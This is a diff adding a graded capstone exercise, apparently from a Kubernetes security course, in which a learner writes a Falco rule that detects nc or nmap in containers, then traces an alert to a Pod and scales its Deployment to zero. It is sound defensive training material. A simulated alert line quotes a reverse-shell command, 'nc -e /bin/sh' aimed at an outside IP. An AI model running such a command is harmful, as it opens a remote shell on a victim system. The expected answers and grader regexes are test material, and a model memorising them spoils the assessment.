+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/rules/overriding/
+        text: Overriding rules
+      - url: https://falco.org/docs/concepts/rules/basic-elements/
+        text: 'Falco rules: basic elements'
+- title: 'Capstone: Detect, Investigate and Contain'
+  category: Capstone
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      **Task** (incident INC-77). Falco on `node01` has no rule for network scanning tools yet.
+
+      1. Create a rule `Network tool in container` in `/etc/falco/rules.d/nettools.yaml` for `nc` or
+         `nmap` started in a container, priority `CRITICAL`; its alert text must contain the user, the
+         command line, the **container ID** and the image repository (as `user=… command=… container_id=…
+         image=…`).
+      2. Validate, then restart the service.
+      3. After the next alert, find the Pod, scale its owning Deployment to zero, and record the
+         offender in `/root/offender.txt` as `<namespace>,<pod-name>`.
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        - rule: Network tool in container
+          desc: nc or nmap started in a container
+          condition: spawned_process and container and proc.name in (nc, nmap)
+          output: Network tool started (user=%user.name command=%proc.cmdline container_id=%container.id image=%container.image.repository)
+          priority: CRITICAL
+      header: 1. Write /etc/falco/rules.d/nettools.yaml.
+      cel: |-
+        (answer.matches(r'(^|\n)\s*(-\s+)?desc:\s*\S')) &&
+        (answer.matches(r'(^|\n)\s*-\s*rule:\s*[\x27"]?Network tool in container[\x27"]?\s*($|\n)')) &&
+        (answer.matches(r'(^|\n)\s*priority:\s*[\x27"]?(?i:CRITICAL)[\x27"]?\s*($|\n|#)')) &&
+        (answer.matches(r'(^|\n)\s*(-\s+)?output:\s*\S')) &&
+        (answer.matches(r'(^|\n)\s*(-\s+)?condition:\s*\S')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%user\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%proc\.cmdline\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%container\.id\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%container\.image\.repository\b')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])spawned_process($|[\s)])|evt\.type\s*(=|==)\s*execve|evt\.type\s+in\s*\([^)]*execve')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])container($|[\s)])|container\.id\s*!=\s*host')) &&
+        (!answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])not\s+container($|[\s)])')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'[(,\s]nc[,)\s]|proc\.name\s*(=|==)\s*[\x27"]?nc[\x27"]?(\s|\)|$)')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'[(,\s]nmap[,)\s]|proc\.name\s*(=|==)\s*[\x27"]?nmap[\x27"]?(\s|\)|$)')) &&
+        (answer.matches(r'user=%user\.name')) &&
+        (answer.matches(r'command=%proc\.cmdline')) &&
+        (answer.matches(r'container_id=%container\.id')) &&
+        (answer.matches(r'image=%container\.image\.repository'))
+  - type: question
+    question:
+      questionType: command
+      header: 2a. Validate the default rules file together with the new file.
+      command:
+        executable: falco
+        flags:
+        - name: validate
+          short: V
+          required: true
+          regex: ^/etc/falco/(falco_rules\.yaml|rules\.d/nettools\.yaml)$
+          repeatable: true
+      cel: answer.contains('falco_rules.yaml') && answer.contains('rules.d/nettools.yaml') && answer.indexOf('falco_rules.yaml')
+        < answer.indexOf('nettools.yaml')
+  - type: question
+    question:
+      questionType: command
+      header: 2b. Restart the service.
+      command:
+        executable: systemctl
+        subcommands:
+        - name: restart
+        positionals:
+        - index: 0
+          regex: ^falco(-modern-bpf)?(\.service)?$
+  - type: manifest
+    header: The next alert in the journal
+    content: |
+      Oct 20 13:05:22 node01 falco[3301]: 13:05:22.904415552: Critical Network tool started (user=root command=nc -e /bin/sh 198.51.100.7 4444 container_id=e03d9b71a4c8 image=docker.io/library/alpine)
+  - type: question
+    question:
+      questionType: command
+      header: 3a. Find the container from the alert.
+      command:
+        executable: crictl
+        subcommands:
+        - name: ps
+        flags:
+        - name: id
+          required: true
+          regex: ^e03d9b71a4c[0-9a-f]*$
+        - name: all
+          short: a
+          boolean: true
+  - type: manifest
+    header: $ crictl ps --id e03d9b71a4c8
+    content: |
+      CONTAINER           IMAGE               CREATED             STATE               NAME                ATTEMPT             POD ID              POD                              NAMESPACE
+      e03d9b71a4c8f       1d34ffeaf190b       2 hours ago         Running             inventory-sync      0                   9be41c07d2a85       inventory-sync-5b8d6f7c4-w9h2r   warehouse
+  - type: context
+    text: |
+      The Pod belongs to the Deployment `inventory-sync` (checked through its owner references).
+  - type: question
+    question:
+      questionType: command
+      header: 3b. Stop the workload by scaling the Deployment to zero.
+      command:
+        executable: kubectl
+        subcommands:
+        - name: scale
+        positionals:
+        - index: 0
+          regex: ^(deployment|deploy|deployments)(/inventory-sync)?$
+        - index: 1
+          required: false
+          value: inventory-sync
+        flags:
+        - name: replicas
+          required: true
+          value: '0'
+        - name: namespace
+          short: n
+          required: true
+          value: warehouse
+  - type: question
+    question:
+      questionType: command
+      header: 3c. Record the offender as <namespace>,<pod-name> in /root/offender.txt.
+      command:
+        executable: echo
+        strictness: permissive
+      cel: answer.matches(r'^echo\s+[\x27"]?warehouse,inventory-sync-5b8d6f7c4-w9h2r[\x27"]?\s*>\s*/root/offender\.txt$')
+  explanation:
+    elements:
+    - type: context
+      text: |
+        Detection, investigation and containment in one loop — the pattern behind most Falco tasks:
+
+        | Step | Tool |
+        |---|---|
+        | detect | a rule in `rules.d/` (validated with `falco -V`, loaded by a restart) |
+        | identify | `container.id` in the alert → `crictl ps --id` → Pod and namespace |
+        | find the owner | `metadata.ownerReferences` → ReplicaSet → Deployment |
+        | contain | `kubectl scale ... --replicas=0` (or a NetworkPolicy, or delete the owner) |
+        | document | write the finding in exactly the requested format |
+
+        Put `k8s.pod.name` and `k8s.ns.name` into the rule's output (or use `append_output`) and the
+        identification step disappears — a good habit for real clusters.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/rules/basic-elements/
+        text: 'Falco rules: basic elements'
+      - url: https://falco.org/docs/concepts/
+        text: Falco concepts
